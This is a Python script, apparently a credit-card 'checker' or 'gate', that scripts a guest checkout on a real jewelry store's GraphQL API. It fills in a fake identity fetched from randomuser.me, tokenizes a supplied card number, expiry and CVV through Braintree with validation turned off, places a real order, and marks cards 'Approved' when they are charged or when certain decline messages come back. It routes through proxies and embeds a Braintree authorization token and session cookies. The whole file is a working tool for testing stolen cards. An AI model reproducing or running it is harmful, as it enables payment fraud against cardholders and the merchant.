from httpx import AsyncClient
import uuid

email = uuid.uuid4().hex[:8] + '@gmail.com'

async def b3gateavs(cc, mes, ano, cvv,proxyg):
    client = AsyncClient(proxies=proxyg, verify=False, timeout=None)

    response = await client.get("https://randomuser.me/api/1.2/?nat=US")
    user = response.text
    street = user.split('"street":"')[1].split('"')[0]
    city = user.split('"city":"')[1].split('"')[0]
    state1 = user.split('"state":"')[1].split('"')[0]
    zipcode = user.split('"postcode":')[1].split(',')[0]
    phone = user.split('"phone":"')[1].split('"')[0]
    name = user.split('"first":"')[1].split('"')[0]
    last = user.split('"last":"')[1].split('"')[0]

    headers = {
        'accept': '*/*',
        'accept-language': 'es-419,es;q=0.9',
        'authorization': '',
        'content-type': 'application/json',
        'origin': 'https://www.riddlesjewelry.com',
        'priority': 'u=1, i',
        'referer': 'https://www.riddlesjewelry.com/round-freshwater-pearl-earrings-on-sterling-silver-5-5-5mmfwear-ss-254479.html',
        'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'store': 'default',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
    }

    json_data = {
        'operationName': 'createCart',
        'variables': {},
        'query': 'mutation createCart {\n  cartId: createEmptyCart\n}\n',
    }

    req1 = await client.post('https://www.riddlesjewelry.com/graphql', headers=headers, json=json_data)
    cartid = req1.json()['data']['cartId']

    headers = {
        'accept': '*/*',
        'accept-language': 'es-419,es;q=0.9',
        'authorization': '',
        'content-type': 'application/json',
        # 'cookie': 'AMP_MKTG_16a5c84b5b=JTdCJTdE; AMP_16a5c84b5b=JTdCJTIyZGV2aWNlSWQlMjIlM0ElMjIzMzM5YWQ4OS1hZTlhLTQ5NTAtOTc5My03YTg3NGE2MWFjNjYlMjIlMkMlMjJzZXNzaW9uSWQlMjIlM0ExNzMyNDQxODMwMDUzJTJDJTIyb3B0T3V0JTIyJTNBZmFsc2UlMkMlMjJsYXN0RXZlbnRUaW1lJTIyJTNBMTczMjQ0MTgzMDA4OSU3RA==; private_content_version=d929603d2c3d92be1c43865264765efb; PAPVisitorId=WhRebfH5FLUudeCtxwaOfKhfp3NKvVfU; PAPVisitorId=WhRebfH5FLUudeCtxwaOfKhfp3NKvVfU; _gcl_au=1.1.71749192.1732441831; _ga=GA1.1.745610266.1732441831; scarab.visitor=%226F2C77482BCF2655%22; scarab.profile=%22254479%7C1732441834%22; _fbp=fb.1.1732441830894.811579868706223193; _uetsid=8ada57a0aa4911efa0e0ad023686dc49; _uetvid=8ada5ba0aa4911efa029356faffad159; PHPSESSID=9a044d2be2caca5158c40b6450175439; _ga_2E3F3H7H5B=GS1.1.1732441830.1.1.1732441833.57.0.594092444',
        'origin': 'https://www.riddlesjewelry.com',
        'priority': 'u=1, i',
        'referer': 'https://www.riddlesjewelry.com/round-freshwater-pearl-earrings-on-sterling-silver-5-5-5mmfwear-ss-254479.html',
        'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'store': 'default',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        'x-magento-cache-id': '43d5941c0c56ff875f153cd3bb46b535e75800e9a04f81433f5643331b041bce',
    }

    json_data = {
        'operationName': 'AddProductToCart',
        'variables': {
            'cartId': cartid,
            'product': {
                'sku': '268080',
                'quantity': 1,
            },
        },
        'query': 'mutation AddProductToCart($cartId: String!, $product: CartItemInput!) {\n  addProductsToCart(cartId: $cartId, cartItems: [$product]) {\n    cart {\n      id\n      ga_add_to_cart\n      gtm_add_to_cart\n      ...CartTriggerFragment\n      ...MiniCartFragment\n      __typename\n    }\n    user_errors {\n      code\n      message\n      __typename\n    }\n    __typename\n  }\n}\n\nfragment CartTriggerFragment on Cart {\n  id\n  total_quantity\n  __typename\n}\n\nfragment MiniCartFragment on Cart {\n  id\n  total_quantity\n  prices {\n    subtotal_excluding_tax {\n      currency\n      value\n      __typename\n    }\n    __typename\n  }\n  ...ProductListFragment\n  __typename\n}\n\nfragment ProductListFragment on Cart {\n  id\n  items {\n    id\n    uid\n    product {\n      id\n      name\n      estimated_delivery\n      url_key\n      thumbnail {\n        url\n        __typename\n      }\n      stock_status\n      sku\n      ... on ConfigurableProduct {\n        variants {\n          attributes {\n            uid\n            __typename\n          }\n          product {\n            id\n            thumbnail {\n              url\n              __typename\n            }\n            __typename\n          }\n          __typename\n        }\n        __typename\n      }\n      __typename\n    }\n    prices {\n      price {\n        currency\n        value\n        __typename\n      }\n      __typename\n    }\n    quantity\n    ... on ConfigurableCartItem {\n      configurable_options {\n        id\n        option_label\n        value_id\n        value_label\n        __typename\n      }\n      customWithConfig: customizable_options {\n        customizable_option_uid\n        id\n        is_required\n        label\n        sort_order\n        type\n        values {\n          id\n          label\n          value\n          __typename\n        }\n        __typename\n      }\n      __typename\n    }\n    ... on SimpleCartItem {\n      customWithSimple: customizable_options {\n        customizable_option_uid\n        id\n        is_required\n        label\n        sort_order\n        type\n        values {\n          id\n          label\n          value\n          __typename\n        }\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n  __typename\n}\n',
    }

    req2 = await client.post('https://www.riddlesjewelry.com/graphql', headers=headers, json=json_data)


    headers = {
        'accept': '*/*',
        'accept-language': 'es-419,es;q=0.9',
        'authorization': '',
        'content-type': 'application/json',
        # 'cookie': 'AMP_MKTG_16a5c84b5b=JTdCJTdE; AMP_16a5c84b5b=JTdCJTIyZGV2aWNlSWQlMjIlM0ElMjIzMzM5YWQ4OS1hZTlhLTQ5NTAtOTc5My03YTg3NGE2MWFjNjYlMjIlMkMlMjJzZXNzaW9uSWQlMjIlM0ExNzMyNDQxODMwMDUzJTJDJTIyb3B0T3V0JTIyJTNBZmFsc2UlMkMlMjJsYXN0RXZlbnRUaW1lJTIyJTNBMTczMjQ0MTgzMDA4OSU3RA==; PAPVisitorId=WhRebfH5FLUudeCtxwaOfKhfp3NKvVfU; PAPVisitorId=WhRebfH5FLUudeCtxwaOfKhfp3NKvVfU; _gcl_au=1.1.71749192.1732441831; _ga=GA1.1.745610266.1732441831; scarab.visitor=%226F2C77482BCF2655%22; scarab.profile=%22254479%7C1732441834%22; _fbp=fb.1.1732441830894.811579868706223193; _uetsid=8ada57a0aa4911efa0e0ad023686dc49; _uetvid=8ada5ba0aa4911efa029356faffad159; PHPSESSID=9a044d2be2caca5158c40b6450175439; private_content_version=58be1d325eabaf296e527669e5bb5d1b; _ga_2E3F3H7H5B=GS1.1.1732441830.1.1.1732441960.42.0.594092444',
        'origin': 'https://www.riddlesjewelry.com',
        'priority': 'u=1, i',
        'referer': 'https://www.riddlesjewelry.com/checkout',
        'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'store': 'default',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        'x-magento-cache-id': '43d5941c0c56ff875f153cd3bb46b535e75800e9a04f81433f5643331b041bce',
    }

    json_data = {
        'operationName': 'SetGuestShipping',
        'variables': {
            'cartId': cartid,
            'email': email,
            'address': {
                'firstname': name,
                'lastname': last,
                'street': [
                    street,
                ],
                'city': city,
                'postcode': zipcode,
                'telephone': phone,
                'region': "41",
                'country_code': 'US',
            },
        },
        'query': 'mutation SetGuestShipping($cartId: String!, $email: String!, $address: CartAddressInput!) {\n  setGuestEmailOnCart(input: {cart_id: $cartId, email: $email}) {\n    cart {\n      id\n      __typename\n    }\n    __typename\n  }\n  setShippingAddressesOnCart(input: {cart_id: $cartId, shipping_addresses: [{address: $address}]}) {\n    cart {\n      id\n      ...ShippingInformationFragment\n      ...ShippingMethodsCheckoutFragment\n      ...PriceSummaryFragment\n      ...AvailablePaymentMethodsFragment\n      __typename\n    }\n    __typename\n  }\n}\n\nfragment ShippingInformationFragment on Cart {\n  id\n  email\n  shipping_addresses {\n    city\n    country {\n      code\n      label\n      __typename\n    }\n    firstname\n    lastname\n    postcode\n    region {\n      code\n      label\n      region_id\n      __typename\n    }\n    street\n    telephone\n    __typename\n  }\n  __typename\n}\n\nfragment ShippingMethodsCheckoutFragment on Cart {\n  id\n  ...AvailableShippingMethodsCheckoutFragment\n  ...SelectedShippingMethodCheckoutFragment\n  shipping_addresses {\n    country {\n      code\n      __typename\n    }\n    postcode\n    region {\n      code\n      __typename\n    }\n    street\n    __typename\n  }\n  __typename\n}\n\nfragment AvailableShippingMethodsCheckoutFragment on Cart {\n  id\n  shipping_addresses {\n    available_shipping_methods {\n      amount {\n        currency\n        value\n        __typename\n      }\n      available\n      carrier_code\n      method_code\n      method_title\n      __typename\n    }\n    street\n    __typename\n  }\n  __typename\n}\n\nfragment SelectedShippingMethodCheckoutFragment on Cart {\n  id\n  shipping_addresses {\n    selected_shipping_method {\n      amount {\n        currency\n        value\n        __typename\n      }\n      carrier_code\n      method_code\n      method_title\n      __typename\n    }\n    street\n    __typename\n  }\n  __typename\n}\n\nfragment PriceSummaryFragment on Cart {\n  id\n  items {\n    id\n    quantity\n    __typename\n  }\n  ...ShippingSummaryFragment\n  prices {\n    ...TaxSummaryFragment\n    ...DiscountSummaryFragment\n    ...GrandTotalFragment\n    subtotal_excluding_tax {\n      currency\n      value\n      __typename\n    }\n    __typename\n  }\n  ...GiftCardSummaryFragment\n  __typename\n}\n\nfragment DiscountSummaryFragment on CartPrices {\n  discounts {\n    amount {\n      currency\n      value\n      __typename\n    }\n    label\n    __typename\n  }\n  __typename\n}\n\nfragment GiftCardSummaryFragment on Cart {\n  id\n  applied_gift_cards {\n    code\n    applied_balance {\n      value\n      currency\n      __typename\n    }\n    __typename\n  }\n  __typename\n}\n\nfragment GrandTotalFragment on CartPrices {\n  grand_total {\n    currency\n    value\n    __typename\n  }\n  __typename\n}\n\nfragment ShippingSummaryFragment on Cart {\n  id\n  shipping_addresses {\n    selected_shipping_method {\n      amount {\n        currency\n        value\n        __typename\n      }\n      __typename\n    }\n    street\n    __typename\n  }\n  __typename\n}\n\nfragment TaxSummaryFragment on CartPrices {\n  applied_taxes {\n    amount {\n      currency\n      value\n      __typename\n    }\n    __typename\n  }\n  __typename\n}\n\nfragment AvailablePaymentMethodsFragment on Cart {\n  id\n  available_payment_methods {\n    code\n    title\n    __typename\n  }\n  __typename\n}\n',
    }

    req3 = await client.post('https://www.riddlesjewelry.com/graphql', headers=headers, json=json_data)

    json_data = {
        'operationName': 'SetShippingMethod',
        'variables': {
            'cartId': cartid,
            'shippingMethod': {
                'carrier_code': 'flatrateone',
                'method_code': 'flatrate',
            },
        },
        'query': 'mutation SetShippingMethod($cartId: String!, $shippingMethod: ShippingMethodInput!) {\n  setShippingMethodsOnCart(input: {cart_id: $cartId, shipping_methods: [$shippingMethod]}) {\n    cart {\n      id\n      available_payment_methods {\n        code\n        title\n        __typename\n      }\n      ...SelectedShippingMethodCheckoutFragment\n      ...PriceSummaryFragment\n      ...ShippingInformationFragment\n      ...AvailableShippingMethodsCheckoutFragment\n      __typename\n    }\n    __typename\n  }\n}\n\nfragment AvailableShippingMethodsCheckoutFragment on Cart {\n  id\n  shipping_addresses {\n    available_shipping_methods {\n      amount {\n        currency\n        value\n        __typename\n      }\n      available\n      carrier_code\n      method_code\n      method_title\n      __typename\n    }\n    street\n    __typename\n  }\n  __typename\n}\n\nfragment SelectedShippingMethodCheckoutFragment on Cart {\n  id\n  shipping_addresses {\n    selected_shipping_method {\n      amount {\n        currency\n        value\n        __typename\n      }\n      carrier_code\n      method_code\n      method_title\n      __typename\n    }\n    street\n    __typename\n  }\n  __typename\n}\n\nfragment PriceSummaryFragment on Cart {\n  id\n  items {\n    id\n    quantity\n    __typename\n  }\n  ...ShippingSummaryFragment\n  prices {\n    ...TaxSummaryFragment\n    ...DiscountSummaryFragment\n    ...GrandTotalFragment\n    subtotal_excluding_tax {\n      currency\n      value\n      __typename\n    }\n    __typename\n  }\n  ...GiftCardSummaryFragment\n  __typename\n}\n\nfragment DiscountSummaryFragment on CartPrices {\n  discounts {\n    amount {\n      currency\n      value\n      __typename\n    }\n    label\n    __typename\n  }\n  __typename\n}\n\nfragment GiftCardSummaryFragment on Cart {\n  id\n  applied_gift_cards {\n    code\n    applied_balance {\n      value\n      currency\n      __typename\n    }\n    __typename\n  }\n  __typename\n}\n\nfragment GrandTotalFragment on CartPrices {\n  grand_total {\n    currency\n    value\n    __typename\n  }\n  __typename\n}\n\nfragment ShippingSummaryFragment on Cart {\n  id\n  shipping_addresses {\n    selected_shipping_method {\n      amount {\n        currency\n        value\n        __typename\n      }\n      __typename\n    }\n    street\n    __typename\n  }\n  __typename\n}\n\nfragment TaxSummaryFragment on CartPrices {\n  applied_taxes {\n    amount {\n      currency\n      value\n      __typename\n    }\n    __typename\n  }\n  __typename\n}\n\nfragment ShippingInformationFragment on Cart {\n  id\n  email\n  shipping_addresses {\n    city\n    country {\n      code\n      label\n      __typename\n    }\n    firstname\n    lastname\n    postcode\n    region {\n      code\n      label\n      region_id\n      __typename\n    }\n    street\n    telephone\n    __typename\n  }\n  __typename\n}\n',
    }

    req4 = await client.post('https://www.riddlesjewelry.com/graphql', headers=headers, json=json_data)

    json_data = {
        'operationName': 'setBillingAddress',
        'variables': {
            'cartId': cartid,
            'firstName': name,
            'lastName': last,
            'city': "Orange",
            'postcode': "07050",
            'phoneNumber': phone,
            'street1': "103-105 Central",
            'street2': '',
            'country': 'US',
            'region': "41",
            'sameAsShipping': True,
        },
        'query': 'mutation setBillingAddress($cartId: String!, $firstName: String!, $lastName: String!, $street1: String!, $street2: String, $city: String!, $region: String!, $postcode: String!, $country: String!, $phoneNumber: String!) {\n  setBillingAddressOnCart(input: {cart_id: $cartId, billing_address: {address: {firstname: $firstName, lastname: $lastName, street: [$street1, $street2], city: $city, region: $region, postcode: $postcode, country_code: $country, telephone: $phoneNumber, save_in_address_book: false}}}) {\n    cart {\n      id\n      billing_address {\n        firstname\n        lastname\n        country {\n          code\n          __typename\n        }\n        street\n        city\n        region {\n          code\n          label\n          region_id\n          __typename\n        }\n        postcode\n        telephone\n        __typename\n      }\n      ...PriceSummaryFragment\n      ...AvailablePaymentMethodsFragment\n      __typename\n    }\n    __typename\n  }\n}\n\nfragment PriceSummaryFragment on Cart {\n  id\n  items {\n    id\n    quantity\n    __typename\n  }\n  ...ShippingSummaryFragment\n  prices {\n    ...TaxSummaryFragment\n    ...DiscountSummaryFragment\n    ...GrandTotalFragment\n    subtotal_excluding_tax {\n      currency\n      value\n      __typename\n    }\n    __typename\n  }\n  ...GiftCardSummaryFragment\n  __typename\n}\n\nfragment DiscountSummaryFragment on CartPrices {\n  discounts {\n    amount {\n      currency\n      value\n      __typename\n    }\n    label\n    __typename\n  }\n  __typename\n}\n\nfragment GiftCardSummaryFragment on Cart {\n  id\n  applied_gift_cards {\n    code\n    applied_balance {\n      value\n      currency\n      __typename\n    }\n    __typename\n  }\n  __typename\n}\n\nfragment GrandTotalFragment on CartPrices {\n  grand_total {\n    currency\n    value\n    __typename\n  }\n  __typename\n}\n\nfragment ShippingSummaryFragment on Cart {\n  id\n  shipping_addresses {\n    selected_shipping_method {\n      amount {\n        currency\n        value\n        __typename\n      }\n      __typename\n    }\n    street\n    __typename\n  }\n  __typename\n}\n\nfragment TaxSummaryFragment on CartPrices {\n  applied_taxes {\n    amount {\n      currency\n      value\n      __typename\n    }\n    __typename\n  }\n  __typename\n}\n\nfragment AvailablePaymentMethodsFragment on Cart {\n  id\n  available_payment_methods {\n    code\n    title\n    __typename\n  }\n  __typename\n}\n',
    }

    req5 = await client.post('https://www.riddlesjewelry.com/graphql', headers=headers, json=json_data)

    headers = {
        'accept': '*/*',
        'accept-language': 'es-419,es;q=0.9',
        'authorization': 'Bearer production_bnskcxsn_dd75vm7fwn4d5tsv',
        'braintree-version': '2018-05-10',
        'content-type': 'application/json',
        'origin': 'https://assets.braintreegateway.com',
        'priority': 'u=1, i',
        'referer': 'https://assets.braintreegateway.com/',
        'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
    }

    json_data = {
        'clientSdkMetadata': {
            'source': 'client',
            'integration': 'dropin2',
            'sessionId': 'f3f59856-8a09-4a8f-ad73-8da581eff9ff',
        },
        'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       brandCode       last4       binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
        'variables': {
            'input': {
                'creditCard': {
                    'number': cc,
                    'expirationMonth': mes,
                    'expirationYear': ano,
                    'cvv': cvv,
                    'cardholderName': name ,
                    "billingAddress": {
                            "postalCode": zipcode,
                        },
                },
                'options': {
                    'validate': False,
                },
            },
        },
        'operationName': 'TokenizeCreditCard',
    }

    req6 = await client.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
    tokencc = req6.json()['data']['tokenizeCreditCard']['token']

    headers = {
        'accept': '*/*',
        'accept-language': 'es-419,es;q=0.9',
        'authorization': '',
        'content-type': 'application/json',
        # 'cookie': 'AMP_MKTG_16a5c84b5b=JTdCJTdE; AMP_16a5c84b5b=JTdCJTIyZGV2aWNlSWQlMjIlM0ElMjIzMzM5YWQ4OS1hZTlhLTQ5NTAtOTc5My03YTg3NGE2MWFjNjYlMjIlMkMlMjJzZXNzaW9uSWQlMjIlM0ExNzMyNDQxODMwMDUzJTJDJTIyb3B0T3V0JTIyJTNBZmFsc2UlMkMlMjJsYXN0RXZlbnRUaW1lJTIyJTNBMTczMjQ0MTgzMDA4OSU3RA==; PAPVisitorId=WhRebfH5FLUudeCtxwaOfKhfp3NKvVfU; PAPVisitorId=WhRebfH5FLUudeCtxwaOfKhfp3NKvVfU; _gcl_au=1.1.71749192.1732441831; _ga=GA1.1.745610266.1732441831; scarab.visitor=%226F2C77482BCF2655%22; scarab.profile=%22254479%7C1732441834%22; _fbp=fb.1.1732441830894.811579868706223193; _uetsid=8ada57a0aa4911efa0e0ad023686dc49; _uetvid=8ada5ba0aa4911efa029356faffad159; PHPSESSID=9a044d2be2caca5158c40b6450175439; _ga_2E3F3H7H5B=GS1.1.1732441830.1.1.1732441960.42.0.594092444; tracker_device_is_opt_in=true; tracker_device=810a0a09-3a4d-48e9-8a6e-d974cc21a1de; private_content_version=dbb5a533bf2d74606943119896da9162',
        'origin': 'https://www.riddlesjewelry.com',
        'priority': 'u=1, i',
        'referer': 'https://www.riddlesjewelry.com/checkout',
        'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'store': 'default',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        'x-magento-cache-id': '43d5941c0c56ff875f153cd3bb46b535e75800e9a04f81433f5643331b041bce',
    }

    json_data = {
        'operationName': 'setSelectedPaymentMethod',
        'variables': {
            'cartId': cartid,
            'paymentMethod': 'braintree',
            'paymentNonce': tokencc,
        },
        'query': 'mutation setSelectedPaymentMethod($cartId: String!, $paymentNonce: String!) {\n  setPaymentMethodOnCart(input: {cart_id: $cartId, payment_method: {code: "braintree", braintree: {payment_method_nonce: $paymentNonce, is_active_payment_token_enabler: false}}}) {\n    cart {\n      id\n      selected_payment_method {\n        code\n        title\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n',
    }

    req7 = await client.post('https://www.riddlesjewelry.com/graphql', headers=headers, json=json_data)


    headers = {
        'accept': '*/*',
        'accept-language': 'es-419,es;q=0.9',
        'authorization': '',
        'content-type': 'application/json',
        # 'cookie': 'AMP_MKTG_16a5c84b5b=JTdCJTdE; AMP_16a5c84b5b=JTdCJTIyZGV2aWNlSWQlMjIlM0ElMjIzMzM5YWQ4OS1hZTlhLTQ5NTAtOTc5My03YTg3NGE2MWFjNjYlMjIlMkMlMjJzZXNzaW9uSWQlMjIlM0ExNzMyNDQxODMwMDUzJTJDJTIyb3B0T3V0JTIyJTNBZmFsc2UlMkMlMjJsYXN0RXZlbnRUaW1lJTIyJTNBMTczMjQ0MTgzMDA4OSU3RA==; PAPVisitorId=WhRebfH5FLUudeCtxwaOfKhfp3NKvVfU; PAPVisitorId=WhRebfH5FLUudeCtxwaOfKhfp3NKvVfU; _gcl_au=1.1.71749192.1732441831; _ga=GA1.1.745610266.1732441831; scarab.visitor=%226F2C77482BCF2655%22; scarab.profile=%22254479%7C1732441834%22; _fbp=fb.1.1732441830894.811579868706223193; _uetsid=8ada57a0aa4911efa0e0ad023686dc49; _uetvid=8ada5ba0aa4911efa029356faffad159; PHPSESSID=9a044d2be2caca5158c40b6450175439; _ga_2E3F3H7H5B=GS1.1.1732441830.1.1.1732441960.42.0.594092444; tracker_device_is_opt_in=true; tracker_device=810a0a09-3a4d-48e9-8a6e-d974cc21a1de; private_content_version=79504792be8b5acab1e6b086bc5fcd78',
        'origin': 'https://www.riddlesjewelry.com',
        'priority': 'u=1, i',
        'referer': 'https://www.riddlesjewelry.com/checkout',
        'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'store': 'default',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        'x-magento-cache-id': '43d5941c0c56ff875f153cd3bb46b535e75800e9a04f81433f5643331b041bce',
    }

    json_data = {
        'operationName': 'placeOrder',
        'variables': {
            'cartId': cartid,
        },
        'query': 'mutation placeOrder($cartId: String!) {\n  placeOrder(input: {cart_id: $cartId}) {\n    order {\n      order_number\n      __typename\n    }\n    __typename\n  }\n}\n',
    }

    req8 = await client.post('https://www.riddlesjewelry.com/graphql', headers=headers, json=json_data)
    print(req8.text)
    if "order_number" in req8.text:
        status = "Approved ✅"
        mensaje = "Charged $17.98"
    else:
        mensaje = req8.json()['errors'][0]['message'].split('Please try again or use a different payment method. ')[1].strip()
        if "Card Issuer Declined" in mensaje:
            status = "Approved ✅"
        elif "Insufficient Funds" in mensaje:
            status = "Approved ✅"
        elif "avs" in mensaje:
            status = "Approved ✅"
        elif "Limit Exceeded" in mensaje:
            status = "Approved ✅"
        else:
            status = "Declined ❌"
    return status, mensaje